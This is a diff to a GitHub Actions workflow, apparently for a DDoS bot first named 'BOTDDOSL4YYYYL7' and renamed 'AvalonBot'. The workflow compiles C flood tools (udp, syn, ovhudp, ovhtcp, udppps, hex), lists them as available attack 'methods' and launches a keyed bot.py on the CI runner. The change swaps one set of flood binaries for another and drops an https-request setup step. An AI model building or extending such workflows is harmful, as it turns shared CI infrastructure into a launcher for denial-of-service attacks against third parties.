@@ -1,4 +1,4 @@
-name: BOTDDOSL4YYYYL7
+name: AvalonBot
 
 on:
   workflow_dispatch:
@@ -46,15 +46,12 @@ jobs:
 
           # Compilar métodos principales
           binaries=(
+            "hex.c:hex"
             "udp.c:udp"
-            "udphex.c:udphex"
+            "ovhudp.c:ovhudp"
+            "ovhtcp.c:ovhtcp"
+            "syn.c:syn:-lpthread"
             "udppps.c:udppps"
-            "ovh.c:ovh:-lpcap"
-            "udppayload.c:udppayload"
-            "udpbypass.c:udpbypass"
-            "tcp.c:tcp" # Corrected compilation command
-            "httpsrequest.c:httpsrequest"
-            "tcp-syn.c:tcp-syn:-lpthread"  # tcp-syn multi-thread
           )
 
           for entry in "${binaries[@]}"; do
@@ -80,11 +77,6 @@ jobs:
           echo ""
           echo "📂 Ejecutables disponibles:"
           ls -la | grep -E '^-..x.*' | awk '{print $9}' || echo "No hay ejecutables"
-
-      - name: Prepare environment for https-request
-        run: |
-          echo "=== Preparando entorno para https-request ==="
-          sudo python3 install.py
 
       - name: 🚀 EJECUTAR BOT CON KEYS
         env:
@@ -129,12 +121,9 @@ jobs:
           echo "🎮 MÉTODOS DISPONIBLES:"
 
           # Mostrar métodos según ejecutables
-          for method in udp udphex udppps ovh udppayload udpbypass tcp tcp-syn httpsrequest; do
+          for method in hex udp ovhudp ovhtcp syn udppps; do
             [ -f "$method" ] && echo "   • $method"
           done
-
-          [ -f "udpflood.go" ] && echo "   • udpflood (Go)"
-          [ -f "raknet.go" ] && echo "   • raknet (Go)"
 
           echo ""
           echo "🚀 INICIANDO bot.py..."
